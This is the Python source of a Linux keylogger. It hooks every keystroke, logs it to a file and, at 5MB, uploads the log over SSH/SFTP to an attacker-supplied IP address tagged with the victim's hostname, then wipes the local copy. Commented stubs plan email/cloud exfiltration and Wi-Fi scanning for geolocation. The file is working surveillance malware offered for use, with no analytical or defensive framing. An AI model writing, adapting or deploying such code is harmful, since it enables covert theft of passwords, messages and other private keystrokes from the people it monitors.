'''
keylogger for linux. Tested on Ubuntu 16.04. It records keystrokes using pyHook, stores
them in a file called keylogs.txt and transmits back over ssh or email/cloud.

Exit by: <backspace><delete><backspace><delete>

Keylogs are sent when the keylog file reaches 5MB
'''

from pyxhook import HookManager
import socket
import paramiko
import datetime
import json

import os
import threading

from sys import exit as sysExit

data = ''  # To hold logged key
exitStack = []
hostAddress = '<YOUR IP ADDRESS>'
keylogsFile='keylogs.txt'
wifiLogsFile='wifiLogs.txt'
sshServerUsername = '<YOUR USERNAME>'
sshServerPassword = '<YOUR PASSWORD>'

def sendFile():
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostAddress, username=sshServerUsername, password=sshServerPassword)
        sftp = client.open_sftp()
        hostname = socket.gethostname()  # Add hostname to our log file
        sftp.put(keylogsFile, '/home/eschatonic/Desktop/upload/keylogs-' + hostname + '-' + str(datetime.datetime.today())[0:19] + '.txt')
        sftp.put(wifiLogsFile, '/home/eschatonic/Desktop/upload/wifiLogs-' + hostname + '-' + str(datetime.datetime.today())[0:19] + '.txt')
        with open(keylogsFile, 'w') and open(wifiLogsFile, 'w'):  # Clear files
            pass
    except Exception, e:
        print e
# TODO email/cloud option to send log files

# TODO Implement wifiGrab for linux
# def writeWifi():  # To get SSIDs of the wifi in the vicinity for geolocation
#     f = open(wifiLogsFile, 'a+')
#     t = wifiGrab.getWifi()
#     f.write(str(datetime.datetime.now()) + '\n')
#     json.dump(t, f, indent=4)  # write json to file
#     f.write('\n\n\n')
#     f.close()

def writeKeylogs():
    global data
    try:
        # TODO Find a way to encrypt data
        f = open(keylogsFile, 'a+')
        f.write(data)
        f.close()
    except Exception, e:
        print str(e)
    return


class LinuxKeylogger():
    def __init__(self):
        self.new_hook = HookManager()  # Instantiate HookManager class
        self.new_hook.KeyDown = self.onKeyPress  # listen to all keystrokes
        self.new_hook.HookKeyboard()  # hook the keyboard
        self.new_hook.start()  # start the hook session


    def onKeyPress(self, event):
        global timeNow
        global data
        global exitStack
        global keyLength
        global wifiLogsFile
        global keylogsFile

        if event.Key == 'space':
            event.Key = ' '
        elif event.Key == 'Tab':
            event.Key = '<TAB>'
        elif event.Key == 'BackSpace':
            event.Key = '<Backspace>'
        elif event.Key == 'Shift_L' or event.Key == 'Shift_R':
            event.Key = '<Shift>'
        elif event.Key == 'Delete':
            event.Key = '<Delete>'

        data += event.Key
        print exitStack
        if event.Key == '<Backspace>':
            exitStack.append(event.Key)
        elif event.Key == '<Delete>':
            exitStack.append(event.Key)
        else:
            exitStack = []

        if len(exitStack) == 4:
            print exitStack
            if exitStack[0] == '<Backspace>' and exitStack[1] == '<Delete>' and exitStack[2] == '<Backspace>' and exitStack[3] == '<Delete>':  # If last four values
                sysExit(0)
                # TODO Implement a GUI version of our exit task
            else:
                exitStack = []

        if len(data) == 128:  # Write data in chucks of 128 bytes
            writeKeylogs()
            data = ''

        if os.path.getsize(keylogsFile) >= 5e+6:  # Send log file when it reaches 5MB
            t = threading.Thread(target=sendFile(), args=())
            t.start()



